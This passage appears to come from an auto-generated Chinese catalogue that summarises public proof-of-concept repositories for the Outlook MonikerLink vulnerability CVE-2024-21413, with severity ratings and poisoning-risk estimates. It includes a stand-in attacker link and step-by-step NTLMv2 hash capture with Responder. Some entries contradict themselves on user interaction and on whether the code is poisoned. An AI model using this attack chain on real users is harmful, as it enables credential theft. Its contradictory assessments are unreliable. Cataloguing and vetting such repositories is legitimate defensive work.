    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

